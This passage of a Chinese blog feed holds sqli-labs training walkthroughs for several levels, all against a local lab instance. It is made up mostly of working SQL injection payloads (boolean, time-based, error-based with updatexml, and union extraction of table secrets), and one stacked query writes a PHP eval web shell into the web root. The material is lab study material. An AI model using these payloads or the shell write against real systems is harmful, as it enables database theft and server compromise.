<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583907307105.png" alt="1583907307105"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里ascii是101我们对照上面的ascii码发现是e按照之前相同步骤我们这里查询出了emails、referers、uagents、users四个表</span><br><span class="line">说明：查看第一个表名更改，1,1的值，想要查询下一个表名更改limit的值，limit是从0开始，1,1是从1开始</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583907737457.png" alt="1583907737457"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询出了表我们查询字段，还是跟Union一样查看users的字段</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583908711931.png" alt="1583908711931"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们看到结果是105对应ascii码是i，使用相同步骤继续查询，最后得出</span><br><span class="line">id，username，password字段</span><br><span class="line"></span><br><span class="line">查询字段数据和union一样将from后的删掉加上该加的然后查询表数据</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select (id) from users limit 0,1),1,1))&#x3D;49--+</span><br><span class="line"></span><br><span class="line">还有个时间注入效率非常慢，能不用时间注入就不用,</span><br><span class="line">这里演示的是查询他的库名，表名和字段名跟union一样</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&#x3D;115,sleep(3),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583908847437.png" alt="1583908847437"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第五十三关时间_一句话_堆叠</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%89%E5%85%B3%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/</url>
    <content><![CDATA[<p>因为没有报错回显，不能使用报错注入</p>
<p>使用时间注入，当判断大于1回显正常。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-53&#x2F;?sort&#x3D;1&#39; and if((length(database())&gt;1),1,sleep(3)) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%89%E5%85%B3%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585193018276.png" alt="1585193018276"></p>
<p>设置长度等于7，一直加载，说明误</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%89%E5%85%B3%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585193042301.png" alt="1585193042301"></p>
<p>测试得出长度为8，加载完成</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%89%E5%85%B3%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585193062148.png" alt="1585193062148"></p>
<p>查看数据库，ascii等于115时页面加载成功，表示正确，其他一直加载，说明错误</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-53&#x2F;?sort&#x3D;1&#39; and if(ascii(substr(database(),1))&#x3D;115,1,sleep(3)) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%89%E5%85%B3%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585193109468.png" alt="1585193109468"></p>
<p>经过测试得出当前数据库是security</p>
<p>查看表，当结果等于101的时候返回正常，其他加载，101对应的是e，经过测试得知当前表名为emails</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-53&#x2F;?sort&#x3D;1&#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),1,1))&#x3D;101,1,sleep(3)) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%89%E5%85%B3%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585193151974.png" alt="1585193151974"></p>
<p>查询emails下的字段，当ascii等于105是页面加载成功，说明正确，其他ascii码一直加载，说明错误，ascii中的105转义后是 i 的意思，经过测试第一个字段为id</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-53&#x2F;?sort&#x3D;1&#39; and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;emails&#39; limit 0,1),1,1))&#x3D;105,1,sleep(3)) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%89%E5%85%B3%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585193214207.png" alt="1585193214207"></p>
<p>查看id的第一个数据，当ascii等于49返回正常，其他加载，ascii 49 对应的是1，说明第一个数据为1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-53&#x2F;?sort&#x3D;1&#39; and if(ascii(substr((select id from emails limit 0,1),1,1))&#x3D;49,1,sleep(3)) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%89%E5%85%B3%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585193247270.png" alt="1585193247270"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第五十一关报错_时间_一句话_堆叠</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%80%E5%85%B3%E6%8A%A5%E9%94%99_%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/</url>
    <content><![CDATA[<p>使用一句话木马。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-51&#x2F;?sort&#x3D;1&#39;; select &#39;&lt;?php @eval($_POST[admin])?&gt;&#39; into outfile &#39;D:\\phpStudy\\PHPTutorial\\WWW\\one.php&#39; --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%80%E5%85%B3%E6%8A%A5%E9%94%99_%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585187970003.png" alt="1585187970003"></p>
<p>查看文档，one.php成功写入</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%80%E5%85%B3%E6%8A%A5%E9%94%99_%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585187983628.png" alt="1585187983628"></p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>查看当前数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-51&#x2F;?sort&#x3D;1&#39; and updatexml(1,concat(0x7e,(database())),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%80%E5%85%B3%E6%8A%A5%E9%94%99_%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585188098627.png" alt="1585188098627"></p>
<p>查看表，后续操作相同</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-51&#x2F;?sort&#x3D;1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;security&#39;)),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%80%E5%85%B3%E6%8A%A5%E9%94%99_%E6%97%B6%E9%97%B4_%E4%B8%80%E5%8F%A5%E8%AF%9D_%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585188166171.png" alt="1585188166171"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第二十四关</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%9B%9B%E5%85%B3/</url>
    <content><![CDATA[<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%9B%9B%E5%85%B3/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585451036997.png" alt="1585451036997"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第五十七关次数限制union</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%83%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6union/</url>
    <content><![CDATA[<p>查看原始界面，给了CHALLENGES数据库</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%83%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585240272574.png" alt="1585240272574"></p>
<p>用法和之前一样</p>
<p>查看源码，使用双引号闭合</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%83%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585240311501.png" alt="1585240311501"></p>
<p>查看字段数，4返回错误</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%83%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585240359866.png" alt="1585240359866"></p>
<p>查看字段数3</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%83%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585240401340.png" alt="1585240401340"></p>
<p>查看注入点</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%83%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585240444451.png" alt="1585240444451"></p>
<p>查看表，返回lqvuqsit93表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-57&#x2F;?id&#x3D;1111&quot; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;CHALLENGES&#39; --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%83%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585240587098.png" alt="1585240587098"></p>
<p>查看lqvuqsit93表中字段，获得id,sessid,secret_RJ1K,tryy四个字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-57&#x2F;?id&#x3D;1111&quot; union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;lqvuqsit93&#39; --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%83%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585240658742.png" alt="1585240658742"></p>
<p>查看secret_RJ1K字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-57&#x2F;?id&#x3D;1111&quot; union select 1,2,group_concat(secret_RJ1K)from lqvuqsit93 --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%83%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585240698568.png" alt="1585240698568"></p>
<p>或者数据进行提交，返回这个说明成功</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%83%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585240713289.png" alt="1585240713289"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第五十九关报错次数限制</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B9%9D%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/</url>
    <content><![CDATA[<p>查看初始页面</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B9%9D%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585242030543.png" alt="1585242030543"></p>
<p>查看源代码，并没有值进行包裹</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B9%9D%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585242043468.png" alt="1585242043468"></p>
<p>使用union select查看注入点，发现页面没有返回注入点，说明不能使用union注入，因为有报错信息显示，使用报错注入</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B9%9D%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585242200343.png" alt="1585242200343"></p>
<p>使用报错注入查看当前数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-59&#x2F;?id&#x3D;-1 and updatexml(1,concat(0x7e,(database())),1)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B9%9D%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585242278212.png" alt="1585242278212"></p>
<p>查看表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-59&#x2F;?id&#x3D;-1 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;challenges&#39;)),1)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B9%9D%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585242325187.png" alt="1585242325187"></p>
<p>查看字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-59&#x2F;?id&#x3D;-1 and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema&#x3D;&#39;challenges&#39; and table_name&#x3D;&#39;so0c3t2h4x&#39;)),1)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B9%9D%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585242361148.png" alt="1585242361148"></p>
<p>查看secret_7RY9字段中的数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-59&#x2F;?id&#x3D;-1 and updatexml(1,concat(0x7e,(select group_concat(secret_7RY9)from so0c3t2h4x)),1)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B9%9D%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585242406847.png" alt="1585242406847"></p>
<p>提交数据，恭喜你成功了</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B9%9D%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585242420880.png" alt="1585242420880"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第五十五关次数限制Union</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%94%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6Union/</url>
    <content><![CDATA[<p>查看初始页面，其中CHALLENGES是数据库的名字</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%94%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6Union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585229325453.png" alt="1585229325453"></p>
<p>按照要求加上ID，查看页面，限制14次页面运行</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%94%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6Union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585229369355.png" alt="1585229369355"></p>
<p>查看源代码，id被括号包裹</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%94%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6Union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585229457710.png" alt="1585229457710"></p>
<p>加上括号和注释符，查看页面，页面成功返回正常</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%94%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6Union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585229498416.png" alt="1585229498416"></p>
<p>使用order by 查看字段数，字段数4的时候页面返回异常</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%94%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6Union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585229535918.png" alt="1585229535918"></p>
<p>查看字段数3，字段数3页面返回正常</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%94%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6Union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585229557423.png" alt="1585229557423"></p>
<p>查看注入点，注入点2,3</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%94%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6Union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585229595487.png" alt="1585229595487"></p>
<p>查看表名，页面成功返回表ibmeah9iie</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-55&#x2F;?id&#x3D;-1) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;CHALLENGES&#39; --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%94%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6Union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585229660313.png" alt="1585229660313"></p>
<p>查看字段页面成功返回字段数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-55&#x2F;?id&#x3D;-1) union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;ibmeah9iie&#39; --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%94%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6Union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585229707880.png" alt="1585229707880"></p>
<p>查看secret_ZMCY字段中的数据，页面成功返回dDRLwbDflII7XMtZFPiLMVzJ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-55&#x2F;?id&#x3D;-1) union select 1,2,group_concat(secret_ZMCY)from ibmeah9iie --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%94%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6Union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585229763951.png" alt="1585229763951"></p>
<p>将内容复制到secret_Key对话框提交</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%94%E5%85%B3%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6Union/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585229812937.png" alt="1585229812937"></p>
<p>点击submit，成功返回</p>
